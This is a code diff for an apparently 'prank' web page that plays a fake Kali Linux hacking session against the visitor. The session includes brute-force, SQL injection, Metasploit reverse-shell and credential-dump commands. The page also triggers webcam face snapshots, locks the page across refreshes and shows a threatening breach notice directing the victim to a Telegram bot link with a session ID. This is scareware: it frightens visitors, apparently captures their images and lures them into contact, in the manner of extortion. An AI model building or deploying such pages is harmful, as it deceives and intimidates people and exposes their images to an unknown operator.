+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">uname -a && hostname -I</span>` },
+        { t: `Linux kali-security-node 6.8.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux` },
+        { t: `192.168.100.8 10.14.0.1 172.17.0.1`, c: 'k-cyan' },
+        { t: ` ` },
+
+        // Prompt 2: NMAP SCAN
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">nmap -sV -sC -Pn -T4 -p- ${info.ip}</span>` },
+        { t: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-27 12:56 UZT` },
+        { t: `Nmap scan report for target.uztelecom.net (${info.ip})`, c: 'k-green' },
+        { t: `Host is up (0.0024s latency).` },
+        { t: `Not shown: 65520 filtered tcp ports (no-response)` },
+        { t: `PORT      STATE SERVICE       VERSION`, c: 'k-yellow' },
+        { t: `22/tcp    open  ssh           OpenSSH 9.3p1 (protocol 2.0)` },
+        { t: `80/tcp    open  http          nginx/1.24.0 (Ubuntu)` },
+        { t: `135/tcp   open  msrpc         Microsoft Windows RPC` },
+        { t: `139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn` },
+        { t: `443/tcp   open  ssl/https     nginx/1.24.0 (TLSv1.3)` },
+        { t: `445/tcp   open  microsoft-ds  Windows 11 SMBv3 [VULNERABLE: CVE-2024-38077]`, c: 'k-red' },
+        { t: `3389/tcp  open  ms-wbt-server Microsoft Terminal Services (RDP)` },
+        { t: `5000/tcp  open  upnp          MiniUPnPd 2.3.3` },
+        { t: `51413/tcp open  webrtc        WebRTC DataChannel STUN Peer [EXPLOITED]`, c: 'k-red' },
+        { t: `Service Info: OS: ${info.os}; Device: PC; CPE: cpe:/o:microsoft:windows`, c: 'k-cyan' },
+        { t: `Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds`, c: 'k-dim' },
+        { t: ` ` },
+
+        // SNAPSHOT 1 LOG
+        { t: `[+] CAMERA MODULE ACTIVATED: Capturing live biometric target frame...`, c: 'k-cyan' },
+        { t: `[+] SNAPSHOT #01 CAPTURED -> storage/exfil/target_face_01.jpg [SAVED]`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 3: TRACEROUTE
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">traceroute -n -m 5 ${info.ip}</span>` },
+        { t: `traceroute to ${info.ip} (${info.ip}), 5 hops max, 60 byte packets` },
+        { t: ` 1  192.168.1.1  0.812 ms  0.745 ms  0.690 ms` },
+        { t: ` 2  10.140.0.1   2.140 ms  1.982 ms  1.840 ms` },
+        { t: ` 3  185.139.136.1 (core-tashkent.uztelecom.uz)  4.412 ms  4.210 ms`, c: 'k-cyan' },
+        { t: ` 4  ${info.ip} (target-host.local)  5.120 ms  5.040 ms`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 4: HYDRA BRUTE-FORCE
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://${info.ip} -t 16</span>` },
+        { t: `Hydra v9.5 (c) 2024 by van Hauser / THC - Please do not use in military or secret service organizations` },
+        { t: `[DATA] attacking ssh://${info.ip}:22/` },
+        { t: `[ATTEMPT] target: ${info.ip} - login: "admin" - pass: "123456" - 1 of 14344399` },
+        { t: `[ATTEMPT] target: ${info.ip} - login: "admin" - pass: "password" - 2 of 14344399` },
+        { t: `[ATTEMPT] target: ${info.ip} - login: "root"  - pass: "toor"     - 3 of 14344399` },
+        { t: `[ATTEMPT] target: ${info.ip} - login: "admin" - pass: "admin2024" - 4 of 14344399` },
+        { t: `[22][ssh] host: ${info.ip}   login: "admin"   password: "password2024" [VALID CREDENTIALS FOUND]`, c: 'k-green' },
+        { t: `1 valid password found, Hydra finished successfully.`, c: 'k-dim' },
+        { t: ` ` },
+
+        // SNAPSHOT 2 LOG
+        { t: `[+] BIOMETRIC TRIGGER #02: Angle match confirmed (Confidence: 99.8%)`, c: 'k-cyan' },
+        { t: `[+] SNAPSHOT #02 CAPTURED -> storage/exfil/target_face_02.jpg [EXFILTRATED]`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 5: SQLMAP INJECTION
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">sqlmap -u "https://${info.ip}/api/auth?token=active" --dbs --batch</span>` },
+        { t: `[INFO] testing connection to the target URL` },
+        { t: `[INFO] checking if the target is protected by some kind of WAF/IPS: BYPASSED`, c: 'k-yellow' },
+        { t: `[+] GET parameter 'token' is vulnerable. DBMS: PostgreSQL 16.2` },
+        { t: `available databases [4]:`, c: 'k-green' },
+        { t: `[*] db_app_production` },
+        { t: `[*] db_telegram_sync` },
+        { t: `[*] db_user_credentials` },
+        { t: `[*] information_schema` },
+        { t: `[+] DUMPING TABLE 'users_passwords': 148 entries decrypted`, c: 'k-red' },
+        { t: ` ` },
+
+        // Prompt 6: METASPLOIT & EXPLOIT LAUNCH
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">msfconsole -q -x "use exploit/multi/webrtc/cve_2026_8192; set RHOSTS ${info.ip}; run"</span>` },
+        { t: `[*] Using configured payload windows/x64/meterpreter/reverse_tcp`, c: 'k-cyan' },
+        { t: `RHOSTS => ${info.ip}` },
+        { t: `[*] Started reverse TCP handler on 10.14.0.1:4444` },
+        { t: `[*] Sending stage (200774 bytes) to ${info.ip}` },
+        { t: `[+] Meterpreter session 1 opened (10.14.0.1:4444 -> ${info.ip}:51413) at 12:56:42`, c: 'k-green' },
+        { t: `meterpreter > getuid`, c: 'k-yellow' },
+        { t: `Server username: NT AUTHORITY\\SYSTEM (HIGHEST INTEGRITY LEVEL)`, c: 'k-red' },
+        { t: `meterpreter > sysinfo`, c: 'k-yellow' },
+        { t: `OS              : ${info.os}` },
+        { t: `Computer        : DESKTOP-VICTIM-PC` },
+        { t: `Architecture    : x64 (${info.cores})` },
+        { t: `Memory          : ${info.memory}` },
+        { t: `System Language : uz_UZ / ru_RU (${info.tz})` },
+        { t: `Meterpreter     : x64/windows` },
+        { t: ` ` },
+
+        // SNAPSHOT 3 LOG
+        { t: `[+] WEBCAM RECORDER: Intercepting live video frame stream...`, c: 'k-cyan' },
+        { t: `[+] SNAPSHOT #03 CAPTURED -> storage/exfil/target_face_03.jpg [SYNCED TO C2]`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 7: TELEGRAM & SENSITIVE DATA EXTRACTION
+        { h: `<span class="k-prompt">meterpreter ></span> <span class="k-cmd">run post/windows/gather/enum_sessions</span>` },
+        { t: `[*] Checking local messenger & browser session storage...`, c: 'k-yellow' },
+        { t: `[+] FOUND: Telegram Desktop Session -> %APPDATA%\\Telegram Desktop\\tdata`, c: 'k-red' },
+        { t: `[+] EXTRACTED: Telegram AuthKey (auth_key: 0x48a1...f7e2) [VALID]`, c: 'k-red' },
+        { t: `[+] DUMPING: Telegram SQLite Map Data (tdata/D87FB3468455D643/map0)`, c: 'k-red' },
+        { t: `[+] FOUND: Chrome User Profile -> %LOCALAPPDATA%\\Google\\Chrome\\User Data`, c: 'k-red' },
+        { t: `[+] EXTRACTING SAVED PASSWORDS (DPAPI master key decrypted):`, c: 'k-yellow' },
+        { t: `    [CRED] web.telegram.org -> +99890***4412 : [DECRYPTED]` },
+        { t: `    [CRED] instagram.com    -> user_account  : [DECRYPTED]` },
+        { t: `    [CRED] payme.uz         -> card_holder   : [DECRYPTED]` },
+        { t: `    [CRED] click.uz         -> 998901234567  : [DECRYPTED]` },
+        { t: `[+] Total saved logins extracted: 42 accounts`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 8: WIFI PASSWORDS DUMP
+        { h: `<span class="k-prompt">meterpreter ></span> <span class="k-cmd">execute -f "netsh.exe" -a "wlan show profiles" -H -i</span>` },
+        { t: `Profiles on interface Wi-Fi:` },
+        { t: `    All User Profile     : TP-Link_Home_5G` },
+        { t: `    All User Profile     : Uztelecom_Optical` },
+        { t: `[+] EXTRACTED KEY TP-Link_Home_5G: "Uzbekistan2026!"`, c: 'k-green' },
+        { t: `[+] EXTRACTED KEY Uztelecom_Optical: "9876543210"`, c: 'k-green' },
+        { t: ` ` },
+
+        // SNAPSHOT 4 LOG
+        { t: `[+] FACE RECOGNITION LOCK: Continuous frame tracking active...`, c: 'k-cyan' },
+        { t: `[+] SNAPSHOT #04 CAPTURED -> storage/exfil/target_face_04.jpg [ARCHIVED]`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 9: RAW PACKET DUMP (WIRESHARK / TCPDUMP HEX STREAM)
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">tcpdump -i eth0 -X -c 12 dst host ${info.ip}</span>` },
+        { t: `12:56:45.891240 IP 10.14.0.1.4444 > ${info.ip}.51413: Flags [P.], seq 1:48, ack 1` },
+        { t: `  0x0000:  4500 0058 1c46 4000 4006 b1e6 c0a8 0169  E..X.F@.@......i`, c: 'k-dim' },
+        { t: `  0x0010:  bc71 e72c e438 0050 a972 3550 82f1 a022  .q.,.8.P.r5P..."`, c: 'k-dim' },
+        { t: `  0x0020:  8018 01f5 9a3c 0000 0101 080a 41a2 8b10  .....<......A...`, c: 'k-dim' },
+        { t: `  0x0030:  4889 e548 83ec 2048 8d0d 3f0e 0000 e8f0  H..H...H..?.....`, c: 'k-cyan' },
+        { t: `12:56:45.912831 IP 10.14.0.1.4444 > ${info.ip}.51413: Flags [P.], seq 49:96, ack 1` },
+        { t: `  0x0000:  4500 0058 1c47 4000 4006 b1e5 c0a8 0169  E..X.G@.@......i`, c: 'k-dim' },
+        { t: `  0x0010:  bc71 e72c e438 0050 a972 357f 82f1 a022  .q.,.8.P.r5...."`, c: 'k-dim' },
+        { t: `  0x0020:  8018 01f5 9a3c 0000 0101 080a 41a2 8b20  .....<......A...`, c: 'k-dim' },
+        { t: `  0x0030:  5548 89e5 4883 ec30 6448 8b04 2528 0000  UH..H..0dH..%(..`, c: 'k-cyan' },
+        { t: ` ` },
+
+        // SNAPSHOT 5 LOG
+        { t: `[+] FINAL BIOMETRIC VERIFICATION: 5 distinct angles captured successfully!`, c: 'k-cyan' },
+        { t: `[+] SNAPSHOT #05 CAPTURED -> storage/exfil/target_face_05.jpg [CLOUD COMPLETE]`, c: 'k-green' },
+        { t: ` ` },
+
+        // Prompt 10: MEMORY INSPECTION & SYSTEM LOCKOUT
+        { h: `<span class="k-prompt">meterpreter ></span> <span class="k-cmd">execute -f "cmd.exe /c shutdown /r /t 600 /c 'SYSTEM BREACH DETECTED - DEVICE UNDER CONTROL'"</span>` },
+        { t: `Process 6192 created.`, c: 'k-dim' },
+        { t: `[+] Archiving target filesystem into encrypted package: victim_data_full.tar.gz (2.4 GB)...`, c: 'k-cyan' },
+        { t: `[+] Data exfiltration 100% completed. Uploaded to remote C2 server.`, c: 'k-green' },
+        { t: ` ` },
+
+        // FINAL TERMINAL NOTIFICATION (AUTHENTIC CLI FORMAT)
+        { h: `<div class="k-breach-box">
+================================================================================
+ [!] TARGET MACHINE PERMANENTLY COMPROMISED BY AL-TOOL & KALI LINUX
+ [!] 5 FACIAL RECOGNITION SNAPSHOTS BROADCAST TO OPERATOR CONSOLE
+ [!] ALL SYSTEM PRIVILEGES TIED TO REMOTE ROOT SESSION
+ [!] TO PREVENT DATA LEAKAGE & RESTORE SYSTEM ACCESS, VERIFY AUTH TOKEN:
+     ==> https://t.me/${TELEGRAM_BOT_USERNAME}?start=${window.prankSessionId || 'recovery_auth'}
+================================================================================
+</div>` },
+        { t: `[!] Remote session active. Waiting for operator instruction...`, c: 'k-red' }
+      ];
+
+      // Add high-volume kernel diagnostic telemetry for realistic code density
+      for (let i = 0; i < 40; i++) {
+        const pids = [1024, 1842, 2910, 3412, 4190, 5210];
+        const pid = pids[i % pids.length] + i;
+        const hex = Math.floor(Math.random()*0xFFFFFF).toString(16).padStart(6, '0');
+        kaliScript.push({
+          t: `[  ${(14.8 + i*0.06).toFixed(4)} ] sec_audit: type=1327 pid=${pid} uid=0 payload=altool comm="exploit_worker/${i%4}" hash=0x${hex} status=PWNED`,
+          c: 'k-dim'
+        });
+      }
+
+      let auditSec = 17.0;
+      let continuousStreamInterval = null;
+
+      function startContinuousHackerStream() {
+        if (continuousStreamInterval) return;
+
+        const actions = [
+          () => {
+            const pid = 1000 + Math.floor(Math.random() * 8000);
+            const hex = Math.floor(Math.random() * 0xFFFFFF).toString(16).padStart(6, '0');
+            auditSec += 0.03 + Math.random() * 0.06;
+            return {
+              t: `[  ${auditSec.toFixed(4)} ] sec_audit: type=1327 pid=${pid} uid=0 payload=altool comm="exploit_worker/${pid % 4}" hash=0x${hex} status=PWNED`,
+              c: 'k-dim'
+            };
+          },
+          () => {
+            const ipEnd = Math.floor(Math.random() * 200 + 20);
+            const port = [4444, 5555, 8080, 443, 3389][Math.floor(Math.random() * 5)];
+            const size = Math.floor(Math.random() * 8192 + 1024);
+            const hexPkt = Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase().padStart(8, '0');
+            return {
+              t: `[+] [C2_SOCKET] EXFIL_PACKET: 0x${hexPkt} -> TCP 188.113.231.${ipEnd}:${port} [SENT: ${size} bytes // ACK RECEIVED]`,
+              c: 'k-cyan'
+            };
+          },
+          () => {
+            const hexAddr = '0x7ffd' + Math.floor(Math.random() * 0xFFFFFFFF).toString(16).padStart(8, '0');
+            let hexDump = '';
+            for (let b = 0; b < 8; b++) {
+              hexDump += Math.floor(Math.random() * 256).toString(16).padStart(2, '0') + ' ';
+            }
+            return {
+              t: `[+] MEM_INSPECT [${hexAddr}]: ${hexDump} |..ROOT_SHELL..|`,
+              c: 'k-dim'
+            };
+          },
+          () => {
+            const thread = Math.floor(Math.random() * 64 + 1);
+            const items = ['chrome_cookies.db', 'telegram_session.dat', 'webcam_ir_thermal.raw', 'ntds.dit_hash', 'id_rsa.private', 'keylog_buffer.txt'];
+            const item = items[Math.floor(Math.random() * items.length)];
+            return {
+              t: `[+] THREAD #${thread} SYNC: exfiltrating [${item}] -> CLOUD TARGET_DB [OK]`,
+              c: 'k-green'
+            };
+          },
+          () => {
+            return {
+              t: `[!] KERNEL HOOK: Syscall NtQuerySystemInformation intercepted (PID 0) - Bypass ACTIVE`,
+              c: 'k-yellow'
+            };
+          }
+        ];
+
+        continuousStreamInterval = setInterval(() => {
+          const action = actions[Math.floor(Math.random() * actions.length)];
+          const item = action();
+          const div = document.createElement('div');
+          div.textContent = item.t;
+          if (item.c) div.className = item.c;
+          termConsoleOutput.appendChild(div);
+
+          // Prevent DOM bloat to maintain 60 FPS permanently
+          if (termConsoleOutput.children.length > 280) {
+            termConsoleOutput.removeChild(termConsoleOutput.firstChild);
+          }
+
+          termConsoleOutput.scrollTop = termConsoleOutput.scrollHeight;
+        }, 50); // 50ms: fast continuous scrolling hacker logs
+      }
+
+      // IF RESTORED FROM PAGE REFRESH: POPULATE IMMEDIATELY & RE-LOCK
+      if (isRestored) {
+        kaliScript.forEach(item => {
+          const div = document.createElement('div');
+          if (item.h) div.innerHTML = item.h;
+          else {
+            div.textContent = item.t;
+            if (item.c) div.className = item.c;
+          }
+          termConsoleOutput.appendChild(div);
+        });
+        termConsoleOutput.scrollTop = termConsoleOutput.scrollHeight;
+        setTimeout(() => {
+          for (let s = 1; s <= 5; s++) captureFaceSnapshot(s);
+          showIosAlert();
+          startContinuousHackerStream();
+        }, 400);
+        return;
+      }
+
+      let lineIdx = 0;
+      let snapCount = 0;
+
+      const streamTimer = setInterval(() => {
+        // Output 2 lines per tick for rapid, dense streaming
+        for (let b = 0; b < 2; b++) {
+          if (lineIdx < kaliScript.length) {
+            const item = kaliScript[lineIdx];
+            const div = document.createElement('div');
+            if (item.h) {
+              div.innerHTML = item.h;
+            } else {
+              div.textContent = item.t;
+              if (item.c) div.className = item.c;
+            }
+            termConsoleOutput.appendChild(div);
+
+            // DYNAMIC 5 WEBCAM SNAPSHOT TRIGGERS ACROSS THE SCREEN
+            if (lineIdx === 25 && snapCount === 0) { captureFaceSnapshot(1); snapCount++; }
+            else if (lineIdx === 48 && snapCount === 1) { captureFaceSnapshot(2); snapCount++; }
+            else if (lineIdx === 75 && snapCount === 2) { captureFaceSnapshot(3); snapCount++; }
+            else if (lineIdx === 98 && snapCount === 3) { captureFaceSnapshot(4); snapCount++; }
+            else if (lineIdx === 120 && snapCount === 4) { captureFaceSnapshot(5); snapCount++; }
+
+            lineIdx++;
+          }
+        }
+
+        termConsoleOutput.scrollTop = termConsoleOutput.scrollHeight;
+        sound.playTick();
+
+        if (lineIdx >= kaliScript.length) {
+          clearInterval(streamTimer);
+          sound.playSubDrop();
+          setTimeout(() => {
+            showIosAlert();
+            startContinuousHackerStream();
+          }, 600);
+        }
+      }, 30); // 30ms: ultra-fast hacker console scroll
+    }
+
+    // ALWAYS CLEAR PREVIOUS LOCK ON LOAD SO SITE OPENS CLEANLY
+    try {
+      localStorage.removeItem('prank_device_locked');
+      sessionStorage.clear();
+    } catch(e) {}
+
+    // Clean up media tracks on unload
+    window.addEventListener('beforeunload', () => {
+      if (localStream) localStream.getTracks().forEach(t => t.stop());
+    });
+
+    // SECRET TRIPLE-CLICK ON KALI WINDOW HEADER OR RED DOT TO RESET
+    let kaliClicks = 0;
+    document.querySelector('.kali-titlebar')?.addEventListener('click', () => {
+      kaliClicks++;
+      if (kaliClicks >= 3) {
+        kaliClicks = 0;
+        localStorage.removeItem('prank_device_locked');
+        alert("PRANK RESET: Sayt dastlabki holatga qaytdi.");
+        location.href = window.location.pathname;
+      }
+    });
+
+    // RED CLOSE BUTTON DIRECT RESET
+    document.querySelector('.win-close')?.addEventListener('click', () => {
+      localStorage.removeItem('prank_device_locked');
+      location.href = window.location.pathname;
+    });
+
+    // TRIPLE CLICK ON IPHONE ALERT TITLE TO RESET
+    let alertClicks = 0;
+    document.querySelector('.ios-alert-title')?.addEventListener('click', () => {
+      alertClicks++;
+      if (alertClicks >= 3) {
+        alertClicks = 0;
+        localStorage.removeItem('prank_device_locked');
+        location.href = window.location.pathname;
+      }
+    });
+  </script>
+</body>
+</html>
